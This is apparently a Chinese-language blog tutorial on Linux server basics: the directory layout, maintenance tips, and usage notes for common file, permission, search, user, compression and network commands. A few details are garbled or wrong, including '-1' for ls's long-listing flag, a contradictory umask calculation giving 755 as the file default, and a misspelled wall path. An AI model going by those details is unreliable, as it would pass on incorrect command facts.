<h2 id="服务器管理和维护"><a href="#服务器管理和维护" class="headerlink" title="服务器管理和维护"></a>服务器管理和维护</h2><h3 id="目录及作用"><a href="#目录及作用" class="headerlink" title="目录及作用"></a>目录及作用</h3><div class="table-container">
<table>
<thead>
<tr>
<th>目录名</th>
<th>目录作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>/bin/</td>
<td>存放系统命令的目录，普通用户和超级用户都可以执行。不过放在/bin下的命令在单用户模式下也可以执行</td>
</tr>
<tr>
<td>/sbin/</td>
<td>保存和系统环境设置相关的命令，只有超级用户可以使用这些命令进行系统环境设置，但是有些命令可以允许普通用户查看</td>
</tr>
<tr>
<td>/usr/bin/</td>
<td>存放系统命令的目录，普通用户和超级用户都可以执行。这些命令和系统启动无关，在单用户模式下不能执行</td>
</tr>
<tr>
<td>/usr/sbin/</td>
<td>存放根文件系统不必要的系统管理命令，例如多数服务程序。只有超级用户可以使用。大家其实可以注意到Linux的系统，在所有“sbin” 目录中保存的命令只有超级用户可以使用，“bin”目录中保存的命令所有用户都可以使用</td>
</tr>
<tr>
<td>/boot/</td>
<td>系统启动目录，保存系统启动相关的文件，如内核文件和启动引导程序( grub)文件等</td>
</tr>
<tr>
<td>/dev/</td>
<td>设备文件保存位置。我们已经说过Linux中所有内容以文件形式保存，包括硬件。那么这个目录就是用来保存所有硬件设备文件的</td>
</tr>
<tr>
<td>/etc/</td>
<td>配置文件保存位置。系统内所有采用默认安装方式(rpm安装)的服务的配置文件全部都保存在这个目录当中，如用户账户和密码，服务的启动脚本，常用服务的配置文件等</td>
</tr>
<tr>
<td>/home/</td>
<td>普通用户的家目录。建立每个用户时，每个用户要有一个默认登录位置，这个位置就是这个用户的家目录，所有普通用户的家目录就是在/home下建立一个和用户名相同的目录。如用户user1 的家目录就是home/user1</td>
</tr>
<tr>
<td>/lib/</td>
<td>系统调用的函数库保存位置</td>
</tr>
<tr>
<td>/lost+found/</td>
<td>当系统意外崩溃或机器意外关机，而产生一些文件碎片放在这里。当系统启动的过程中fsck工具会检查这里，并修复已经损坏的文件系统。这个目录只在每个分区中出现，例如/lost+found就是根分区的备份恢复目录，/boot/lost+ found就是/boot分区的备份恢复目录</td>
</tr>
<tr>
<td>/media/</td>
<td>挂载目录。系统建议是用来挂载媒体设备的，例如软盘和光盘</td>
</tr>
<tr>
<td>/mnt/</td>
<td>挂载目录，早期Linux中只有这一个挂载目录，并没有细分。现在这个目录系统建议挂载额外设备，如U盘，移动硬盘和其他操作系统的分区</td>
</tr>
<tr>
<td>/misc/</td>
<td>挂载目录。系统建议用来挂载NFS服务的共享目录。只要是一个已经建立的空目录就可以作为挂载点。那么系统虽然准备了三个默认挂载目录/media、/mnt、 /misc, 但是到底在哪个目录中挂载什么设备都可以由管理员自己决定。例如在/mnt下建立不同目录挂载不同设备。如/mnt/cdrom挂载光盘，/mnt/usb挂载U盘</td>
</tr>
<tr>
<td>/opt/</td>
<td>第三方安装的软件保存位置。这个目录就是放置和安装其他软件的位置，手工安装的源码包软件都可以安装到这个目录当中。/usr/local目录也可以用来安装软件(更为常用)</td>
</tr>
<tr>
<td>/proc/</td>
<td>虚拟文件系统，该目录中的数据并不保存到硬盘当中，而是保存到内存当中。主要保存系统的内核，进程，外部设备状态和网络状态灯。如/proc/cpuinfo是保存CPU信息的，/proc/devices是保存设备驱动的列表的，/proc/filesystems是保存文件系统列表的，/proc/net/是保存网络协议信息的</td>
</tr>
<tr>
<td>/sys/</td>
<td>虚拟文件系统。和/proc 目录相似，都是保存在内存当中的，主要是保存于内核相关信息的</td>
</tr>
<tr>
<td>/root/</td>
<td>超级用户的家目录。普通用户家目录在“home”下，超级用户家目录直接在“/”下</td>
</tr>
<tr>
<td>/srv/</td>
<td>服务数据目录。一些系统服务启动之后，可以在这个目录中保存所需要的数据</td>
</tr>
<tr>
<td>/tmp/</td>
<td>临时目录。系统存放临时文件的目录，该目录下所有用户都可以访问和写入。建议此目录中不能保存重要数据，最好每次开机都把该目录清空</td>
</tr>
<tr>
<td>/usr/</td>
<td>系统软件资源目录。注意usr不是user的缩写，而是“Unix Softwre Resource”的缩写，所以不是存放用户数据，而是存放系统软件资源的目录。系统中安装的软件大多数保存在这里</td>
</tr>
<tr>
<td>/var/</td>
<td>动态数据保存位置。主要保存缓存、日志以及软件运行所产生的文件</td>
</tr>
</tbody>
</table>
</div>
<h3 id="服务器注意事项"><a href="#服务器注意事项" class="headerlink" title="服务器注意事项"></a>服务器注意事项</h3><ul>
<li>远程服务器不允许关机，只能重启</li>
<li>重启时应该正确关闭服务</li>
<li>不要在服务器访问高峰运行高负载命令(搜索)</li>
<li>远程配置防火墙时不要把自己踢出服务器</li>
<li>指定合理的密码规范并定期更新</li>
<li>合理分配权限</li>
<li>定期备份重要数据和日志</li>
</ul>
<h2 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h2><h3 id="文件处理命令"><a href="#文件处理命令" class="headerlink" title="文件处理命令"></a>文件处理命令</h3><h4 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h4><p>命令格式:命令 [-选项] [参数]<br>例:ls -la /etc<br>说明:</p>
<ol>
<li>个别命令使用不遵循此格式</li>
<li>当有多个选项时，可以写在一起,绝大多数顺序也可以改变</li>
<li>简化选项与完整选项<br>-a等于--all</li>
</ol>
<h4 id="目录处理命令"><a href="#目录处理命令" class="headerlink" title="目录处理命令"></a>目录处理命令</h4><h5 id="ls命令"><a href="#ls命令" class="headerlink" title="ls命令"></a>ls命令</h5><p>命令名称: ls<br>命令英文原意:list<br>命令所在路径: /bin/ls<br>执行权限:所有用户<br>功能描述:显示目录文件<br>语法: ls 选项[-ald] [文件或目录]<br>    -a  显示所有文件，包括隐藏文件<br>    -1  详细信息显示<br>    -d  查看目录属性<br>    -i  查看i节点(linux中，文件查找不是通过文件名称来查找的。实际上是通过i节点来实现文件的查找定位的。)</p>
<p>-rw-r--r--</p>
<ul>
<li>- 文件类型(-二进制文件 d目录 l软链接文件)</li>
<li>rw- r-- r--<br>u     g    o<br>u所有者 g所属组 o其他人<br>r读 w写 x执行</li>
</ul>
<h5 id="mkdir命令"><a href="#mkdir命令" class="headerlink" title="mkdir命令"></a>mkdir命令</h5><p>命令名称: mkdir<br>命令英文原意: make directories<br>命令所在路径: /bin/mkdir<br>执行权限: 所有用户<br>语法: mkdir -p [目录名]<br>功能描述:创建新目录<br>      -p  递归创建(不加-p只能在已有目录创建一个新目录,而不能创建一个带有子目录的目录)</p>
<p>mkdir可同时创建多个目录  </p>
<h5 id="cd命令"><a href="#cd命令" class="headerlink" title="cd命令"></a>cd命令</h5><p>命令名称: cd<br>命令英文原意: change directory<br>命令所在路径: shell内置命令<br>执行权限: 所有用户<br>语法: cd [目录]<br>功能描述: 切换目录</p>
<h5 id="pwd命令"><a href="#pwd命令" class="headerlink" title="pwd命令"></a>pwd命令</h5><p>命令名称: pwd<br>命令英文原意: print working directory<br>命令所在路径: /bin/pwd<br>执行权限: 所有用户<br>语法: pwd<br>功能描述: 显示当前目录</p>
<h5 id="rmdir命令"><a href="#rmdir命令" class="headerlink" title="rmdir命令"></a>rmdir命令</h5><p>命令名称: rmdir<br>命令英文原意: remove empty directories<br>命令所在路径: /bin/rmdir<br>执行权限: 所有用户<br>语法: rmdir [目录名]<br>功能描述: 只能删除空目录</p>
<h5 id="cp命令"><a href="#cp命令" class="headerlink" title="cp命令"></a>cp命令</h5><p>命令名称: cp<br>命令英文原意: copy<br>命令所在路径: /bin/cp<br>执行权限: 所有用户<br>语法: cp -rp [原文件或目录] [目标目录]<br>    -r  复制目录<br>    -p  保留文件属性(不加-p时会改变文件的修改时间)<br>功能描述: 复制文件或目录到另一个文件(改名)或目录</p>
<p>cp命令可以同时复制多个目录或文件,可以复制并同时改名</p>
<h5 id="mv命令"><a href="#mv命令" class="headerlink" title="mv命令"></a>mv命令</h5><p>命令名称: mv<br>命令英文原意: move<br>命令所在路径: /bin/mv<br>执行权限: 所有用户<br>语法: mv [原文件或目录] [目标目录]<br>功能描述: 剪切文件、改名</p>
<h5 id="rm命令"><a href="#rm命令" class="headerlink" title="rm命令"></a>rm命令</h5><p>命令名称: rm<br>命令英文原意: remove<br>命令所在路径: /bin/rm<br>执行权限: 所有用户<br>语法: rm -rf [文件或目录]<br>    -r  删除目录<br>    -f  强制执行<br>    -i  询问删除<br>功能描述: 删除文件</p>
<p>Linux没有回收站概念,删除文件要谨慎.删除文件前要备份,一旦发现误删除情况,尽量不要对硬盘做过多的读写或查找操作.</p>
<h4 id="文件处理命令-1"><a href="#文件处理命令-1" class="headerlink" title="文件处理命令"></a>文件处理命令</h4><h5 id="touch命令"><a href="#touch命令" class="headerlink" title="touch命令"></a>touch命令</h5><p>命令名称: touch<br>命令所在路径: /bin/touch<br>执行权限: 所有用户<br>语法: touch [文件名]<br>功能描述: 创建空文件</p>
<h5 id="cat命令"><a href="#cat命令" class="headerlink" title="cat命令"></a>cat命令</h5><p>命令名称: cat<br>命令所在路径: /bin/cat<br>执行权限: 所有用户<br>语法: cat -n [文件名]<br>功能描述: 显示文件内容(只能用于查看内容较少的文件,否则滚动条会一直滚动,只显示最后一页,内容较多用more命令)<br>    -n  显示行号<br>    -A  查询所有文件内容,包括隐藏字符</p>
<h5 id="tac命令"><a href="#tac命令" class="headerlink" title="tac命令"></a>tac命令</h5><p>命令名称: tac<br>命令所在路径: /usr/bin/tac<br>执行权限: 所有用户<br>语法: tac [文件名]<br>功能描述: 显示文件内容(反向列示,与cat相反)</p>
<h5 id="more命令"><a href="#more命令" class="headerlink" title="more命令"></a>more命令</h5><p>命令名称: more<br>命令所在路径: /bin/more<br>执行权限: 所有用户<br>语法: more [文件名]<br>    (空格)或f  翻页<br>    (Enter)  换行<br>    q或Q  退出<br>功能描述: 分页显示文件内容(无法向上翻页)</p>
<h5 id="less命令"><a href="#less命令" class="headerlink" title="less命令"></a>less命令</h5><p>命令名称: less<br>命令所在路径: /usr/bin/less<br>执行权限: 所有用户<br>语法: less [文件名]<br>    (空格)或f  翻页<br>    (Enter)  换行<br>    q或Q  退出<br>    pgup  向上翻页<br>    pgdn  向下翻页<br>    /[关键词]  搜索<br>    n  搜索下一个<br>功能描述: 分页显示文件内容(可向上翻页),可进行搜索</p>
<h5 id="head命令"><a href="#head命令" class="headerlink" title="head命令"></a>head命令</h5><p>命令名称: head<br>命令所在路径: /usr/bin/head<br>执行权限: 所有用户<br>语法: head -n [行数] [文件名]<br>功能描述: 显示文件前面几行<br>    -n  指定行数(不加默认显示前10行)</p>
<h5 id="tail命令"><a href="#tail命令" class="headerlink" title="tail命令"></a>tail命令</h5><p>命令名称: tail<br>命令所在路径: /usr/bin/tail<br>执行权限: 所有用户<br>语法: tail -n [行数] [文件名]<br>功能描述: 显示文件后面几行<br>    -n  指定行数(不加默认显示后10行)<br>    -f  动态显示文件末尾内容(监控日志)</p>
<h4 id="链接命令"><a href="#链接命令" class="headerlink" title="链接命令"></a>链接命令</h4><h5 id="ln命令"><a href="#ln命令" class="headerlink" title="ln命令"></a>ln命令</h5><p>命令名称: ln<br>命令英文原意: link<br>命令所在路径: /bin/ln<br>执行权限: 所有用户<br>语法: ln -s [原文件] [目标文件]<br>    -s  创建软链接(不加创建硬链接)<br>功能描述: 生成链接文件</p>
<h5 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h5><ol>
<li>软链接全部都为lrwxrwxrwx,软链接权限不决定源文件权限,用户对软链接操作时具有什么权限由软链接对应的源文件确定</li>
<li>文件大小只是符号链接</li>
<li>软链接有箭头指向源文件</li>
<li>源文件删除,软链接失效</li>
</ol>
<h5 id="硬链接"><a href="#硬链接" class="headerlink" title="硬链接"></a>硬链接</h5><ol>
<li>拷贝(保留文件属性)cp -p + 同步更新</li>
<li>通过i节点识别(ls -i [文件名])(一个文件对应一个i节点,一个i节点可以对应多个文件)</li>
<li>不能跨分区(类似将windowsC盘的文件硬链接到D盘)</li>
<li>不能针对目录使用</li>
<li>源文件删除,硬链接依旧存在</li>
</ol>
<h3 id="权限管理命令"><a href="#权限管理命令" class="headerlink" title="权限管理命令"></a>权限管理命令</h3><h4 id="chmod命令"><a href="#chmod命令" class="headerlink" title="chmod命令"></a>chmod命令</h4><p>命令名称: chmod<br>命令英文原意: change the permissions mode of a file<br>命令所在路径: /bin/chmod<br>执行权限: 所有用户<br>语法: chmod [{ugoa} {+-=} {rwx}] [文件或目录]<br>                        [mode=421(rwx)] [文件或目录]<br>                        -R  递归修改主目录及主目录下所有目录或文件的权限<br>功能描述:改变文件或目录权限</p>
<p>如果有几个类型的用户需要同时设置权限,用逗号分隔</p>
<h4 id="文件目录权限总结"><a href="#文件目录权限总结" class="headerlink" title="文件目录权限总结"></a>文件目录权限总结</h4><div class="table-container">
<table>
<thead>
<tr>
<th>代表字符</th>
<th>权限</th>
<th>对文件的含义</th>
<th>对目录的含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>r</td>
<td>读权限</td>
<td>可以查看文件内容</td>
<td>可以列出目录中内容</td>
</tr>
<tr>
<td>w</td>
<td>写权限</td>
<td>可以修改文件内容</td>
<td>可以在目录中创建、删除文件</td>
</tr>
<tr>
<td>x</td>
<td>执行权限</td>
<td>可以执行文件</td>
<td>可以进入目录</td>
</tr>
</tbody>
</table>
</div>
<p>只有文件所有者和root可以改变文件权限</p>
<h4 id="其他权限管理命令"><a href="#其他权限管理命令" class="headerlink" title="其他权限管理命令"></a>其他权限管理命令</h4><h5 id="chown命令"><a href="#chown命令" class="headerlink" title="chown命令"></a>chown命令</h5><p>命令名称: chown<br>命令英文原意: change file ownership<br>命令所在路径: /bin/chown<br>执行权限: 所有用户<br>语法: chown [用户] [文件或目录]<br>功能描述: 改变文件或目录的所有者</p>
<p>只有root可以改变文件或目录的所有者</p>
<h5 id="chgrp命令"><a href="#chgrp命令" class="headerlink" title="chgrp命令"></a>chgrp命令</h5><p>命令名称: chgrp<br>命令英文原意: change file group ownership<br>命令所在路径: /bin/chgrp<br>执行权限: 所有用户<br>语法: chgrp [用户组] [文件或目录]<br>功能描述: 改变文件或目录的所属组</p>
<h5 id="umask命令"><a href="#umask命令" class="headerlink" title="umask命令"></a>umask命令</h5><p>命令名称: umask<br>命令英文原意: the user file-creation mask<br>命令所在路径: Shell内置命令<br>执行权限: 所有用户<br>语法: umask [-S]<br>    -S  以rwx形式显示新建文件缺省(默认)权限<br>功能描述:显示、设置文件的缺省权限(默认)</p>
<p>新建文件默认不具有可执行权限;使用umask命令会显示0022,其中,0表示特殊权限,022为权限掩码,真正的权限(缺省)为777-022=755;修改默认权限可以通过下面方式</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">umask 权限掩码</span><br></pre></td></tr></table></figure>
<h3 id="文件搜索命令"><a href="#文件搜索命令" class="headerlink" title="文件搜索命令"></a>文件搜索命令</h3><p>搜索会占用大量的系统资源</p>
<h4 id="find命令"><a href="#find命令" class="headerlink" title="find命令"></a>find命令</h4><p>命令名称: find<br>命令所在路径: /bin/find<br>执行权限: 所有用户<br>语法: find [搜索范围] [匹配条件]<br>    -name  根据文件名搜索(严格区分大小写)<br>    -iname  根据文件名搜索(不区分大小写)<br>    -size  根据文件大小搜索<br>    -user  根据所有者搜索<br>    -group  根据所属组搜索<br>    -amin  访问时间(access)<br>    -cmin  文件属性(change)<br>    -mmin  文件内容(modify)<br>    -a  两个条件同时满足(and)<br>    -o  两个条件满足任意一个即可(or)<br>    -type  根据文件类型查找(f文件 d目录 l软链接文件)<br>    -exec/-ok 命令 {} \;  对搜索结果执行操作(花括号表示对搜索结果做替换,反斜杠表示转义符,分号表示结束;-ok和-exec最大的区别是有一个询问确认的环节)<br>    -inum  根据i节点搜索<br>功能描述: 文件搜索</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F;etc -name init &#x2F;&#x2F;在etc目录搜索文件名为init的文件和目录(精准搜索)</span><br><span class="line">find &#x2F;etc -name *init*  &#x2F;&#x2F;在etc目录搜索文件名中包含init的文件和目录(模糊搜索)</span><br><span class="line">find &#x2F;etc -name init*  &#x2F;&#x2F;在etc目录搜索以init开头的文件和目录(*匹配任意字符)</span><br><span class="line">find &#x2F;etc -name init???  &#x2F;&#x2F;在etc目录搜索以init开头并且后面还有三个字母的文件或目录(问号匹配单个字符)</span><br><span class="line">find &#x2F; -size +204800  &#x2F;&#x2F;在根目录下查找大于100MB的文件和目录  </span><br><span class="line">+n 大于    -n 小于    n 等于  1数据块&#x3D;512字节&#x3D;0.5k</span><br><span class="line">find &#x2F;etc -cmin -5 &#x2F;&#x2F;在&#x2F;etc下查找5分钟内被修改过属性的文件和目录</span><br><span class="line">find &#x2F;etc -mmin +5 &#x2F;&#x2F;在&#x2F;etc下查找5分钟前被修改过内容的文件和目录</span><br><span class="line">find &#x2F;etc -size +163840 -a -size -204800  &#x2F;&#x2F;在&#x2F;etc下查找大于8OMB小于100MB的文件和目录</span><br><span class="line">find &#x2F;etc -name init* -a -type f &#x2F;&#x2F;在etc目录搜索以init开头的文件(没有目录)</span><br><span class="line">find &#x2F;etc -name inittab -exec ls -l &#123;&#125; \;  &#x2F;&#x2F;在&#x2F;etc下查找inittab文件并显示其详细信息</span><br><span class="line">find . -inum 123 -exec rm &#123;&#125; \;  &#x2F;&#x2F;在当前目录搜索i节点为123的文件和目录并删除</span><br></pre></td></tr></table></figure>
<p>不要在服务器高峰期使用find命令;搜索范围越小越好,搜索条件越精准越好</p>
<h4 id="其他搜索命令"><a href="#其他搜索命令" class="headerlink" title="其他搜索命令"></a>其他搜索命令</h4><h5 id="locate命令"><a href="#locate命令" class="headerlink" title="locate命令"></a>locate命令</h5><p>命令名称: locate<br>命令所在路径: /usr/bin/locate<br>执行权限: 所有用户<br>语法: locate 文件名<br>功能描述: 在文件资料库(自动定期更新)中查找文件(比find快)<br>    -i  不区分大小写(不加区分大小写)</p>
<p>如果一个新建立的文件没有被收录,就查找不到,可以使用updatedb更新文件资料库;/tmp存放临时文件,(存放临时文件的目录)不在locate文件资料库收录范围,无法查找/tmp中文件</p>
<h5 id="which命令"><a href="#which命令" class="headerlink" title="which命令"></a>which命令</h5><p>命令名称: which<br>命令所在路径: /usr/bin/which<br>执行权限: 所有用户<br>语法: which 命令名称<br>功能描述: 搜索命令所在目录及别名信息</p>
<h5 id="whereis命令"><a href="#whereis命令" class="headerlink" title="whereis命令"></a>whereis命令</h5><p>命令名称: whereis<br>命令所在路径: /usr/bin/whereis<br>执行权限: 所有用户<br>语法: whereis [命令名称]<br>功能描述: 搜索命令所在目录及帮助文档路径(配置文件)</p>
<h5 id="grep命令"><a href="#grep命令" class="headerlink" title="grep命令"></a>grep命令</h5><p>命令名称: grep<br>命令所在路径: /bin/grep<br>执行权限: 所有用户<br>语法: grep -iv [指定字串] [文件]<br>功能描述: 在文件中搜寻字串匹配的行并输出<br>    -i  不区分大小写<br>    -v  排除指定字串<br>    -n  输出行号<br>    --color=auto   搜索出的关键字用颜色显示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep -v ^# &#x2F;etc&#x2F;inittab  &#x2F;&#x2F;搜索时去掉以#号开头的内容</span><br></pre></td></tr></table></figure>
<h3 id="帮助命令"><a href="#帮助命令" class="headerlink" title="帮助命令"></a>帮助命令</h3><h4 id="man命令"><a href="#man命令" class="headerlink" title="man命令"></a>man命令</h4><p>命令名称: man<br>命令英文原意: manual<br>命令所在路径: /usr/bin/man<br>执行权限: 所有用户<br>语法: man [命令或配置文件]<br>功能描述: 获得(命令或配置文件的)帮助信息</p>
<p>man命令与more和less类似;man查看配置文件的帮助信息不要加绝对路径,只要加配置文件名称即可;1表示命令的帮助,5表示配置文件的帮助</p>
<h4 id="whatis命令"><a href="#whatis命令" class="headerlink" title="whatis命令"></a>whatis命令</h4><p>命令名称: whatis<br>命令所在路径: /usr/bin/whatis<br>执行权限: 所有用户<br>语法: whatis [命令]<br>功能描述: 获得命令(相对man命令更为简短)的帮助信息</p>
<h4 id="apropos命令"><a href="#apropos命令" class="headerlink" title="apropos命令"></a>apropos命令</h4><p>命令名称: apropos<br>命令所在路径: /usr/bin/apropos<br>执行权限: 所有用户<br>语法: apropos [配置文件]<br>功能描述: 获得配置文件(相对man命令更为简短)的帮助信息</p>
<h4 id="info命令"><a href="#info命令" class="headerlink" title="info命令"></a>info命令</h4><p>命令名称: info<br>命令英文原意: information<br>命令所在路径: /usr/bin/info<br>执行权限: 所有用户<br>语法: info [命令或配置文件]<br>功能描述: 获得(命令或配置文件的)帮助信息</p>
<p>info命令与man命令类似,只是显示方式不同</p>
<h4 id="help"><a href="#help" class="headerlink" title="--help"></a>--help</h4><p>命令名称: --help<br>执行权限: 所有用户<br>语法: 命令 --help<br>功能描述: 获得命令主要选项的帮助信息(适用于外部命令)</p>
<h4 id="help命令"><a href="#help命令" class="headerlink" title="help命令"></a>help命令</h4><p>命令名称: help<br>命令所在路径: Shell内置命令<br>执行权限: 所有用户<br>语法: help 命令<br>功能描述: 获得Shell(命令解释器)内置命令(找不到路径)的帮助信息(不能使用man查看)</p>
<p>可以使用type [命令名称],来查看是外部命令还是内置命令</p>
<h3 id="用户管理命令"><a href="#用户管理命令" class="headerlink" title="用户管理命令"></a>用户管理命令</h3><h4 id="useradd命令"><a href="#useradd命令" class="headerlink" title="useradd命令"></a>useradd命令</h4><p>命令名称: useradd<br>命令所在路径: /usr/sbin/useradd<br>执行权限: root<br>语法: useradd 用户名<br>功能描述: 添加新用户</p>
<h4 id="passwd命令"><a href="#passwd命令" class="headerlink" title="passwd命令"></a>passwd命令</h4><p>命令名称: passwd<br>命令所在路径: /usr/bin/passwd<br>执行权限: 所有用户<br>语法: passwd 用户名<br>功能描述: 设置用户密码</p>
<p>root用户更改密码不用遵循密码复杂度要求;普通用户更改密码必须遵循密码复杂度要求.root可以更改任何人的密码,普通用户只能更改自己的密码</p>
<h4 id="who命令"><a href="#who命令" class="headerlink" title="who命令"></a>who命令</h4><p>命令名称: who<br>命令所在路径: /usr/bin/who<br>执行权限: 所有用户<br>语法: who<br>功能描述: 查看登录用户信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">登录用户名 登录终端(tty本地终端,pts远程终端) 登录时间 登录ip</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/01/30/FzxVm3KoPpfQLXJ.png" alt=""></p>
<h4 id="w命令"><a href="#w命令" class="headerlink" title="w命令"></a>w命令</h4><p>命令名称: w<br>命令所在路径: /usr/bin/w<br>执行权限: 所有用户<br>语法: w<br>功能描述: 查看登录用户详细信息(比who更详细)</p>
<p><img src="https://i.loli.net/2021/01/30/CF9i24xHXTBqMKs.png" alt=""></p>
<h3 id="压缩解压命令"><a href="#压缩解压命令" class="headerlink" title="压缩解压命令"></a>压缩解压命令</h3><h4 id="du命令"><a href="#du命令" class="headerlink" title="du命令"></a>du命令</h4><p>命令名称: du<br>命令英文原意: disk usage<br>命令所在路径: /usr/bin/du<br>执行权限: 所有用户<br>语法: du [文件或目录] -h<br>    -h  以K,M,G为单位,提高信息的可读性<br>    -s  仅显示每个参数的总计<br>功能描述: 显示文件或目录的大小</p>
<h4 id="tar命令"><a href="#tar命令" class="headerlink" title="tar命令"></a>tar命令</h4><p>命令名称: tar<br>命令所在路径: /bin/tar<br>执行权限:所有用户<br>语法: tar 选项[-cvf] 打包文件 源文件(可以有多个源文件,只打包解包不压缩)<br>    -c  创建tar包<br>    -x  解tar包<br>    -v  显示详细信息(进度)<br>    -f  备份文件(f必须放在后面)<br>    -C  解包到指定路径<br>    -z  压缩为.gz文件(将.gz文件解压)<br>    -j   压缩为.bz2文件(将.bz2文件解压)<br>功能描述: 归档管理</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar -cvf xxx.tar 1.c 2.c 3.c    &#x2F;&#x2F;将1.c,2.c,3.c打包至tar文件(* 全部打包)</span><br><span class="line">tar -xvf xxx.tar -C 路径    &#x2F;&#x2F;指定目录解包,不指定路径,默认在当前路径解包</span><br><span class="line">tar -czvf xxx.tar.gz 1.c 2.c   &#x2F;&#x2F;打包同时压缩为.gz文件</span><br><span class="line">tar -xzvf xxx.tar.gz      &#x2F;&#x2F;解压并解包</span><br><span class="line">tar -cjvf xxx.tar.bz2 1.c 2.c   &#x2F;&#x2F;打包同时压缩为.bz2文件</span><br><span class="line">tar -xjvf xxx.tar.bz2      &#x2F;&#x2F;解压并解包</span><br></pre></td></tr></table></figure>
<h4 id="gzip命令"><a href="#gzip命令" class="headerlink" title="gzip命令"></a>gzip命令</h4><p>命令名称: gzip<br>命令英文原意: GNU zip<br>命令所在路径: /bin/gzip<br>执行权限: 所有用户<br>语法: gzip [文件]<br>功能描述: 压缩文件(自动生成.gz文件,且不保留源文件)<br>    -d  解压文件<br>    -r  压缩所有子目录中文件(不能压缩目录)<br>压缩后文件格式: .gz</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gzip -r 目录(假设为test) &#x2F;&#x2F;将test目录及其子目录下所有文件压缩为.gz文件</span><br><span class="line">gzip -d -r 目录(假设为test) &#x2F;&#x2F;将test目录及其子目录下所有文件解压</span><br></pre></td></tr></table></figure>
<h4 id="gunzip命令"><a href="#gunzip命令" class="headerlink" title="gunzip命令"></a>gunzip命令</h4><p>命令名称: gunzip<br>命令英文原意: GNU unzip<br>命令所在路径: /bin/gunzip<br>执行权限: 所有用户<br>语法: gunzip [压缩文件]<br>功能描述: 解压.gz的压缩文件</p>
<h4 id="bzip2命令"><a href="#bzip2命令" class="headerlink" title="bzip2命令"></a>bzip2命令</h4><p>命令名称: bzip2<br>命令所在路径: /usr/bin/bzip2<br>执行权限: 所有用户<br>语法: bzip2 [文件]<br>功能描述: 压缩文件(自动生成.bz2文件,且不保留源文件,不能压缩目录,没有-r选项)<br>    -d  解压文件<br>    -k  产生压缩文件后保留源文件<br>压缩后文件格式: .bz2</p>
<h4 id="bunzip2命令"><a href="#bunzip2命令" class="headerlink" title="bunzip2命令"></a>bunzip2命令</h4><p>命令名称: bunzip2<br>命令所在路径: /usr/bin/bunzip2<br>执行权限: 所有用户<br>语法: bunzip2 选项[-k] [压缩文件]<br>    -k  解压后保留原文件<br>功能描述: 解压.bz2文件</p>
<h4 id="zip命令"><a href="#zip命令" class="headerlink" title="zip命令"></a>zip命令</h4><p>命令名称: zip<br>命令所在路径: /usr/bin/zip<br>执行权限: 所有用户<br>语法: zip 选项[-r] [压缩后文件名] [文件或目录]<br>    -r  压缩目录<br>功能描述: 压缩文件或目录(能保留源文件)<br>压缩后文件格式: .zip</p>
<h4 id="unzip命令"><a href="#unzip命令" class="headerlink" title="unzip命令"></a>unzip命令</h4><p>命令名称: unzip<br>命令所在路径: /usr/bin/unzip<br>执行权限: 所有用户<br>语法: unzip [压缩文件]<br>功能描述: 解压.zip的压缩文件</p>
<h3 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h3><h4 id="write命令"><a href="#write命令" class="headerlink" title="write命令"></a>write命令</h4><p>命令名称: write<br>命令所在路径: /usr/bin/write<br>执行权限: 所有用户<br>语法: write &lt;用户名&gt;<br>功能描述: 给指定在线用户发信息,以Ctrl+D保存结束</p>
<h4 id="wall命令"><a href="#wall命令" class="headerlink" title="wall命令"></a>wall命令</h4><p>命令名称: wall<br>命令英文原意: write all<br>命令所在路径: /usr/bin/yvall<br>执行权限: 所有用户<br>语法: wall [message]<br>功能描述: 发广播信息(给所有在线用户发送)</p>
<h4 id="ping命令"><a href="#ping命令" class="headerlink" title="ping命令"></a>ping命令</h4><p>命令名称: ping<br>命令所在路径: /bin/ping<br>执行权限: 所有用户<br>语法: ping 选项 IP地址<br>    -c  指定发送次数<br>功能描述: 测试网络连通性<br>范例: ping -c 3 ip地址  //ping三次</p>
<h4 id="ifconfig命令"><a href="#ifconfig命令" class="headerlink" title="ifconfig命令"></a>ifconfig命令</h4><p>命令名称: ifconfig<br>命令英文原意: interface configure<br>命令所在路径: /sbin/ifconfig<br>执行权限: root<br>语法: ifconfig 网卡名称 IP地址<br>功能描述:查看和设置网卡信息<br>范例: #ifconfig eth0 192.168.8.250</p>
<h4 id="mail-命令"><a href="#mail-命令" class="headerlink" title="mail 命令"></a>mail 命令</h4><p>命令名称: mail<br>命令所在路径: /bin/mail<br>执行权限: 所有用户<br>语法: mail [用户名]<br>功能描述: 查看发送电子邮件(以Ctrl+D保存结束)(查看邮件时直接使用mail,按q退出)</p>
<h4 id="last命令"><a href="#last命令" class="headerlink" title="last命令"></a>last命令</h4><p>命令名称: last<br>命令所在路径: /usr/bin/last<br>执行权限: 所有用户<br>语法: last<br>功能描述: 列出目前与过去登入系统的用户信息</p>
<h4 id="lastlog命令"><a href="#lastlog命令" class="headerlink" title="lastlog命令"></a>lastlog命令</h4><p>命令名称: lastlog<br>命令所在路径: /usr/bin/lastlog<br>执行权限: 所有用户<br>语法: lastlog<br>    -u 用户uid  查看指定用户登录<br>功能描述:检查某特定用户上次登录的时间</p>
<h4 id="traceroute命令"><a href="#traceroute命令" class="headerlink" title="traceroute命令"></a>traceroute命令</h4><p>命令名称: traceroute<br>命令所在路径: /bin/traceroute<br>执行权限: 所有用户<br>语法: traceroute<br>功能描述:显示数据包到主机间的路径</p>
